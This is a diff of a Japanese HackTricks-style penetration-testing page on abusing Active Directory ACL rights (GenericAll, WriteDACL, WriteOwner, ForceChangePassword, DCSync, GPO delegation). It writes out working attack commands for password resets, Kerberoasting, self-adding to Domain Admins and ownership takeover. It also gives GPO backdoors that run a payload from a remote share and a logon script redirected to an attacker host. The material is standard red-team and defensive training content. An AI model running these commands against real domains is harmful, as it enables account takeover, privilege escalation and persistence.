@@ -1,71 +1,80 @@
-# Active Directory ACLs/ACEsの悪用
+# Active Directory ACLs/ACEs の悪用
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**このページは主に** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **および** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**の技術の要約です。詳細については、元の記事を確認してください。**
+**このページは主に** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **および** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**の手法の要約です。詳細は元の記事を参照してください。**
 
 ## BadSuccessor
+
 
 {{#ref}}
 BadSuccessor.md
 {{#endref}}
 
-## **ユーザーに対するGenericAll権限**
+## **ユーザーに対する GenericAll 権限**
 
-この権限は、攻撃者にターゲットユーザーアカウントに対する完全な制御を与えます。`Get-ObjectAcl`コマンドを使用して`GenericAll`権限が確認されると、攻撃者は以下を行うことができます：
+この権限は攻撃者にターゲットのユーザーアカウントに対する完全な制御を与えます。`Get-ObjectAcl` コマンドで `GenericAll` 権限が確認されると、攻撃者は次のことができます:
 
-- **ターゲットのパスワードを変更**: `net user <username> <password> /domain`を使用して、攻撃者はユーザーのパスワードをリセットできます。
-- **ターゲット化されたKerberoasting**: ユーザーアカウントにSPNを割り当ててkerberoastableにし、次にRubeusとtargetedKerberoast.pyを使用してチケット授与チケット（TGT）ハッシュを抽出し、クラックを試みます。
+- **ターゲットのパスワードを変更する**: `net user <username> <password> /domain` を使用して、攻撃者はユーザーのパスワードをリセットできます。
+- **Targeted Kerberoasting**: ユーザーのアカウントにSPNを割り当ててkerberoastableにし、次にRubeusとtargetedKerberoast.pyを使用してticket-granting ticket (TGT) ハッシュを抽出し、クラックを試みます。
 ```bash
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 ```
-- **Targeted ASREPRoasting**: ユーザーの事前認証を無効にし、そのアカウントをASREPRoastingに対して脆弱にします。
+- **Targeted ASREPRoasting**: ユーザーの pre-authentication を無効化し、そのアカウントを ASREPRoasting に対して脆弱にする。
 ```bash
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
-## **GenericAll 権限のグループ**
+## **グループに対する GenericAll 権限**
 
-この特権により、攻撃者は `Domain Admins` のようなグループに対して `GenericAll` 権限を持っている場合、グループメンバーシップを操作することができます。`Get-NetGroup` を使用してグループの識別名を特定した後、攻撃者は次のことができます：
+この権限により、攻撃者は `Domain Admins` のようなグループに対して `GenericAll` 権限を持っている場合、グループのメンバーシップを操作できます。`Get-NetGroup` でグループの識別名（distinguished name）を特定した後、攻撃者は以下のことができます:
 
-- **自分自身を Domain Admins グループに追加する**: これは、直接コマンドを使用するか、Active Directory や PowerSploit のようなモジュールを使用して行うことができます。
+- **自分自身を `Domain Admins` グループに追加する**: これは直接コマンドで行うか、Active Directory や PowerSploit のようなモジュールを使用して行えます。
 ```bash
 net group "domain admins" spotless /add /domain
 Add-ADGroupMember -Identity "domain admins" -Members spotless
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
+- Linux上からでもBloodyADを使い、対象グループに対してGenericAll/Writeのメンバーシップを持っていれば任意のグループに自分を追加できます。もし対象グループが“Remote Management Users”にネストされている場合、そのグループを有効にしているホストでは即座にWinRMアクセスを得られます:
+```bash
+# Linux tooling example (BloodyAD) to add yourself to a target group
+bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>
+
+# If the target group is member of "Remote Management Users", WinRM becomes available
+netexec winrm <dc-fqdn> -u <user> -p '<pass>'
+```
 ## **GenericAll / GenericWrite / Write on Computer/User**
 
-これらの権限をコンピュータオブジェクトまたはユーザーアカウントで保持することにより、以下が可能になります：
+コンピューターオブジェクトまたはユーザーアカウントでこれらの権限を保持していると、以下が可能になります：
 
-- **Kerberos Resource-based Constrained Delegation**: コンピュータオブジェクトを乗っ取ることを可能にします。
-- **Shadow Credentials**: この技術を使用して、シャドウクレデンシャルを作成する権限を悪用することで、コンピュータまたはユーザーアカウントを偽装します。
+- **Kerberos Resource-based Constrained Delegation**: コンピューターオブジェクトを乗っ取ることができます。
+- **Shadow Credentials**: この技術を使用して、権限を悪用して shadow credentials を作成することで、コンピューターやユーザーアカウントを偽装できます。
 
 ## **WriteProperty on Group**
 
-特定のグループ（例：`Domain Admins`）のすべてのオブジェクトに対して`WriteProperty`権限を持つユーザーは、以下を行うことができます：
+特定のグループ（例: `Domain Admins`）のすべてのオブジェクトに対して`WriteProperty`権限を持っている場合、以下が可能になります：
 
-- **自分をDomain Adminsグループに追加する**: `net user`と`Add-NetGroupUser`コマンドを組み合わせることで実現可能で、この方法はドメイン内での権限昇格を可能にします。
+- **自分を `Domain Admins` グループに追加する**: `net user` と `Add-NetGroupUser` コマンドを組み合わせて実行することで実現可能で、この方法はドメイン内での権限昇格を可能にします。
 ```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-## **グループの自己（自己メンバーシップ）**
+## **グループに対する Self（自己メンバーシップ）**
 
-この特権により、攻撃者は`Domain Admins`などの特定のグループに自分自身を追加することができます。グループメンバーシップを直接操作するコマンドを使用します。以下のコマンドシーケンスを使用すると、自己追加が可能です：
+この権限により、攻撃者はグループメンバーシップを直接操作するコマンドを使って、自分自身を `Domain Admins` のような特定のグループに追加できます。次のコマンド列を使用すると自己追加が可能です：
 ```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-## **WriteProperty (自己メンバーシップ)**
+## **WriteProperty (Self-Membership)**
 
-同様の特権であり、攻撃者はグループのプロパティを変更することで、自分自身をグループに直接追加することができます。これには、これらのグループに対する `WriteProperty` 権限が必要です。この特権の確認と実行は次のように行われます:
+同様の権限で、対象グループに対して `WriteProperty` 権限を持っている場合、攻撃者はグループのプロパティを変更して自身を直接グループに追加できます。この権限の確認と実行は以下で行われます：
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
 ```
 ## **ForceChangePassword**
 
-`User-Force-Change-Password`のためのユーザーに対する`ExtendedRight`を保持することで、現在のパスワードを知らなくてもパスワードのリセットが可能になります。この権利の確認とその悪用は、PowerShellや代替のコマンドラインツールを通じて行うことができ、インタラクティブセッションや非インタラクティブ環境向けのワンライナーを含む、ユーザーのパスワードをリセットするためのいくつかの方法を提供します。コマンドは、シンプルなPowerShellの呼び出しからLinux上での`rpcclient`の使用まで多岐にわたり、攻撃ベクトルの多様性を示しています。
+ユーザーに対して `User-Force-Change-Password` の `ExtendedRight` を持っていると、現在のパスワードを知らなくてもパスワードをリセットできます。 この権利の検証と悪用は PowerShell やその他のコマンドラインツールで行うことができ、対話型セッションや非対話環境向けのワンライナーを含む複数の方法でユーザーのパスワードをリセットできます。 コマンドは単純な PowerShell 呼び出しから Linux 上の `rpcclient` を使うものまであり、attack vectors の多様性を示しています。
 ```bash
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
@@ -76,9 +85,9 @@ Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureStri
 rpcclient -U KnownUsername 10.10.10.192
 > setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
 ```
-## **WriteOwner on Group**
+## **グループの WriteOwner**
 
-攻撃者がグループに対して `WriteOwner` 権限を持っていることが判明した場合、彼らはそのグループの所有権を自分自身に変更することができます。これは、問題のグループが `Domain Admins` の場合に特に影響が大きく、所有権を変更することでグループの属性やメンバーシップに対するより広範な制御が可能になります。このプロセスは、`Get-ObjectAcl` を使用して正しいオブジェクトを特定し、その後 `Set-DomainObjectOwner` を使用して所有者を SID または名前で変更することを含みます。
+攻撃者があるグループに対して `WriteOwner` 権限を持っていることを発見した場合、グループの所有者を自分自身に変更できます。これは対象のグループが `Domain Admins` の場合に特に影響が大きく、所有権を変更することでグループ属性やメンバーシップに対するより広範な制御が可能になります。プロセスは、まず `Get-ObjectAcl` で対象オブジェクトを特定し、次に `Set-DomainObjectOwner` を使用して SID または名前で所有者を変更する、という手順になります。
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
@@ -86,13 +95,13 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
 ## **GenericWrite on User**
 
-この権限により、攻撃者はユーザーのプロパティを変更できます。具体的には、`GenericWrite` アクセスを使用すると、攻撃者はユーザーのログオンスクリプトパスを変更して、ユーザーのログオン時に悪意のあるスクリプトを実行させることができます。これは、`Set-ADObject` コマンドを使用して、ターゲットユーザーの `scriptpath` プロパティを攻撃者のスクリプトを指すように更新することで実現されます。
+この権限により、攻撃者はユーザーのプロパティを変更できます。具体的には、`GenericWrite` アクセスがあれば、攻撃者はユーザーのログオンスクリプトパスを変更して、ユーザーのログオン時に悪意のあるスクリプトを実行させることができます。これは、`Set-ADObject` コマンドを使用して対象ユーザーの `scriptpath` プロパティを攻撃者のスクリプトを指すように更新することで実現します。
 ```bash
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
 ## **GenericWrite on Group**
 
-この特権を持つ攻撃者は、特定のグループに自分自身や他のユーザーを追加するなど、グループメンバーシップを操作できます。このプロセスには、資格情報オブジェクトを作成し、それを使用してユーザーをグループに追加または削除し、PowerShellコマンドでメンバーシップの変更を確認することが含まれます。
+この権限があれば、攻撃者はグループのメンバーシップを操作できます。例えば、自分自身や他のユーザーを特定のグループに追加することが可能です。このプロセスは、資格情報オブジェクトを作成し、それを使ってユーザーをグループに追加または削除し、PowerShell コマンドでメンバーシップの変更を検証することを含みます。
 ```bash
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
@@ -102,7 +111,7 @@ Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'use
 ```
 ## **WriteDACL + WriteOwner**
 
-ADオブジェクトを所有し、その上で`WriteDACL`権限を持つことは、攻撃者がオブジェクトに対して`GenericAll`権限を付与することを可能にします。これはADSI操作を通じて実現され、オブジェクトに対する完全な制御とそのグループメンバーシップを変更する能力を提供します。それにもかかわらず、Active Directoryモジュールの`Set-Acl` / `Get-Acl` cmdletを使用してこれらの権限を悪用しようとする際には制限があります。
+AD オブジェクトを所有し、そのオブジェクトに対して `WriteDACL` 権限を持っていると、攻撃者はそのオブジェクトに対して自分自身に `GenericAll` 権限を付与することができます。これは ADSI 操作によって実現され、オブジェクトの完全な制御とグループメンバーシップの変更が可能になります。とはいえ、Active Directory モジュールの `Set-Acl` / `Get-Acl` cmdlets を使用してこれらの権限を悪用しようとする際には制限があります。
 ```bash
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -112,64 +121,65 @@ $ADSI.psbase.commitchanges()
 ```
 ## **ドメイン上のレプリケーション (DCSync)**
 
-DCSync攻撃は、ドメイン上の特定のレプリケーション権限を利用して、ドメインコントローラーを模倣し、ユーザーの資格情報を含むデータを同期します。この強力な技術は、`DS-Replication-Get-Changes`のような権限を必要とし、攻撃者がドメインコントローラーへの直接アクセスなしにAD環境から機密情報を抽出することを可能にします。[**DCSync攻撃の詳細はこちら。**](../dcsync.md)
+DCSync attackは、ドメイン上の特定のレプリケーション権限を利用してDomain Controllerを模倣し、ユーザー資格情報を含むデータを同期します。この強力な手法は `DS-Replication-Get-Changes` のような権限を必要とし、攻撃者がDomain Controllerに直接アクセスせずにAD環境から機密情報を抽出できるようにします。 [**Learn more about the DCSync attack here.**](../dcsync.md)
 
-## GPO委任 <a href="#gpo-delegation" id="gpo-delegation"></a>
+## GPOの委任 <a href="#gpo-delegation" id="gpo-delegation"></a>
 
-### GPO委任
+### GPOの委任
 
-グループポリシーオブジェクト (GPO) を管理するための委任されたアクセスは、重大なセキュリティリスクをもたらす可能性があります。たとえば、`offense\spotless`のようなユーザーにGPO管理権限が委任されると、**WriteProperty**、**WriteDacl**、および**WriteOwner**のような特権を持つ可能性があります。これらの権限は、PowerViewを使用して特定された悪用のために利用される可能性があります: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Group Policy Objects (GPOs) の管理を委任されたアクセスは重大なセキュリティリスクを招く可能性があります。例えば、`offense\spotless` のようなユーザーにGPO管理権限が委任されている場合、**WriteProperty**, **WriteDacl**, **WriteOwner** といった権限を持つことがあります。これらの権限は悪用され得るもので、PowerViewを使って次のように確認できます: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
 ### GPO権限の列挙
 
-誤って構成されたGPOを特定するために、PowerSploitのcmdletを連結することができます。これにより、特定のユーザーが管理権限を持つGPOを発見することができます: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+誤設定されたGPOを特定するには、PowerSploitのcmdletを連結して使用できます。これにより、特定のユーザーが管理権限を持つGPOを発見できます: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-**適用されたポリシーを持つコンピュータ**: 特定のGPOが適用されるコンピュータを解決することが可能で、潜在的な影響の範囲を理解するのに役立ちます。 `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
+**特定のポリシーが適用されているコンピュータ**: 特定のGPOがどのコンピュータに適用されているかを解決して、潜在的な影響範囲を把握できます。 `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
-**特定のコンピュータに適用されたポリシー**: 特定のコンピュータに適用されているポリシーを確認するには、`Get-DomainGPO`のようなコマンドを利用できます。
+**特定のコンピュータに適用されているポリシー**: 特定のコンピュータにどのポリシーが適用されているかを確認するには、`Get-DomainGPO` のようなコマンドを使用します。
 
-**特定のポリシーが適用されたOU**: 特定のポリシーに影響を受ける組織単位 (OU) を特定するには、`Get-DomainOU`を使用できます。
+**特定のポリシーが適用されているOU**: 指定されたポリシーによって影響を受ける組織単位（OU）を特定するには、`Get-DomainOU` を使用できます。
 
-また、ツール[**GPOHound**](https://github.com/cogiceo/GPOHound)を使用してGPOを列挙し、問題を見つけることもできます。
+また [**GPOHound**](https://github.com/cogiceo/GPOHound) を使用して GPO を列挙し、問題を見つけることもできます。
 
-### GPOの悪用 - New-GPOImmediateTask
+### Abuse GPO - New-GPOImmediateTask
 
-誤って構成されたGPOは、コードを実行するために悪用される可能性があり、たとえば、即時スケジュールタスクを作成することによって行われます。これにより、影響を受けたマシンのローカル管理者グループにユーザーを追加し、特権を大幅に昇格させることができます:
+誤設定されたGPOはコード実行に悪用される可能性があり、例えば即時スケジュールされたタスクを作成することで実行できます。これにより、影響を受けるマシンのローカル管理者グループにユーザーを追加して権限を大幅に昇格させることができます:
 ```bash
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
-### GroupPolicy モジュール - GPOの悪用
+### GroupPolicy module - Abuse GPO
 
-GroupPolicy モジュールがインストールされている場合、新しい GPO の作成とリンク、影響を受けたコンピュータでバックドアを実行するためのレジストリ値などの設定が可能です。この方法では、GPO を更新し、実行のためにユーザーがコンピュータにログインする必要があります。
+GroupPolicy moduleがインストールされていると、新しいGPOsの作成とリンク、そして影響を受けたコンピュータ上でbackdoorsを実行するためのregistry valuesなどの設定が可能になります。この方法はGPOが更新され、実行のためにユーザーがコンピュータにログインすることを必要とします:
 ```bash
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
-### SharpGPOAbuse - GPOの悪用
+### SharpGPOAbuse - Abuse GPO
 
-SharpGPOAbuseは、既存のGPOを悪用する方法を提供し、新しいGPOを作成することなくタスクを追加したり設定を変更したりします。このツールは、変更を適用する前に既存のGPOを変更するか、RSATツールを使用して新しいGPOを作成する必要があります。
+SharpGPOAbuse は、既存の GPOs を新たに作成することなく、タスクを追加したり設定を変更したりして既存の GPOs を悪用する方法を提供します。  
+このツールを使用するには、変更を適用する前に既存の GPOs を修正するか、RSAT ツールを使用して新しい GPOs を作成する必要があります:
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
-### 強制ポリシー更新
+### ポリシー更新を強制する
 
-GPOの更新は通常90分ごとに行われます。このプロセスを迅速化するために、特に変更を実施した後は、ターゲットコンピュータ上で`gpupdate /force`コマンドを使用して即時のポリシー更新を強制することができます。このコマンドは、次の自動更新サイクルを待たずにGPOへの変更が適用されることを保証します。
+GPO の更新は通常約 90 分ごとに行われます。変更を適用した直後にプロセスを早めたい場合、ターゲットコンピュータ上で `gpupdate /force` を実行して即時のポリシー更新を強制できます。このコマンドにより、次の自動更新サイクルを待たずに GPO の変更が適用されます。
 
-### 背景
+### 内部の仕組み
 
-特定のGPO、例えば`Misconfigured Policy`のスケジュールされたタスクを検査すると、`evilTask`のようなタスクの追加が確認できます。これらのタスクは、システムの動作を変更したり特権を昇格させたりすることを目的としたスクリプトやコマンドラインツールを通じて作成されます。
+特定の GPO の Scheduled Tasks を確認すると、`Misconfigured Policy` のような GPO 内に `evilTask` といったタスクが追加されていることが確認できます。これらのタスクは、システム動作を変更したり権限昇格を狙ったりするスクリプトやコマンドラインツールによって作成されます。
 
-`New-GPOImmediateTask`によって生成されたXML構成ファイルに示されているタスクの構造は、実行されるコマンドやそのトリガーを含むスケジュールされたタスクの詳細を概説しています。このファイルは、GPO内でスケジュールされたタスクがどのように定義され管理されるかを示し、ポリシーの強制の一環として任意のコマンドやスクリプトを実行する方法を提供します。
+`New-GPOImmediateTask` によって生成される XML 構成ファイルに示されるタスクの構造は、実行されるコマンドやトリガーなど、スケジュールされたタスクの詳細を示しています。このファイルは GPO 内でスケジュールタスクがどのように定義・管理されるかを表しており、ポリシー適用の一環として任意のコマンドやスクリプトを実行する手段を提供します。
 
-### ユーザーとグループ
+### Users and Groups
 
-GPOは、ターゲットシステム上のユーザーおよびグループのメンバーシップを操作することも可能です。ユーザーとグループのポリシーファイルを直接編集することで、攻撃者はローカルの`administrators`グループなどの特権グループにユーザーを追加できます。これは、GPO管理権限の委任を通じて可能であり、新しいユーザーを含めたりグループメンバーシップを変更したりするためのポリシーファイルの修正を許可します。
+GPO はターゲットシステム上のユーザーやグループメンバーシップの操作も可能にします。Users and Groups ポリシーファイルを直接編集することで、攻撃者はローカルの `administrators` グループなどの特権グループにユーザーを追加できます。これは、GPO 管理権限の委任によりポリシーファイルを変更して新しいユーザーを含めたりグループメンバーシップを変更したりすることが許可されているためです。
 
-ユーザーとグループのXML構成ファイルは、これらの変更がどのように実施されるかを概説しています。このファイルにエントリを追加することで、特定のユーザーに影響を受けるシステム全体で昇格された特権を付与することができます。この方法は、GPO操作を通じた特権昇格への直接的なアプローチを提供します。
+Users and Groups の XML 構成ファイルは、これらの変更がどのように実装されるかを示しています。このファイルにエントリを追加することで、特定のユーザーに対して影響を受けるシステム全体で昇格した権限を付与できます。この手法は、GPO 操作を通じた直接的な権限昇格の方法を提供します。
 
-さらに、ログオン/ログオフスクリプトの活用、オートランのためのレジストリキーの変更、.msiファイルを介したソフトウェアのインストール、サービス構成の編集など、コードを実行したり持続性を維持したりするための追加の方法も考慮できます。これらの技術は、GPOの悪用を通じてターゲットシステムへのアクセスを維持し制御するためのさまざまな手段を提供します。
+さらに、logon/logoff scripts の活用、registry keys for autoruns の変更、.msi files を使ったソフトウェアのインストール、service configurations の編集など、コード実行や永続化のための追加手段も考えられます。これらの技術は、GPO の悪用によってアクセスを維持しターゲットシステムを制御する多様な経路を提供します。
 
-## 参考文献
+## References
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
